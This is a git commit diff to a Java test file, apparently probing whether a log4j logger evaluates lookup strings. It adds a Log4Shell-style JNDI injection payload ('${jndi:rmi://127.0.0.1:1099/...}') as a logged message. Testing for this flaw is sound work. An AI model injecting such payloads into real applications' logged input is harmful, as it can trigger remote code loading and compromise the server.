9724987444814af7cca80b57b02ce2b6cb62fd03
cheng <dreamboyc@163.com>
2022-04-01 12:48:01 +0800

    第八次提交

--- src/test/java/dao/dome.java
+++ src/test/java/dao/dome.java
@@ -4,9 +4,8 @@ import org.apache.log4j.Logger;
 public class dome {
     public static final Logger logger=Logger.getLogger(JunitTest.class);
     public static void main(String[] args){
-        logger.info("this is info");
-        logger.debug("this is debug");
-        logger.error("this is error");
-        System.out.print("Hello World!！！！");
+        String msg="${java:hw}";
+        logger.info(msg);
+        logger.error("${jndi:rmi://127.0.0.1:1099/xxxx}");
     }
 }
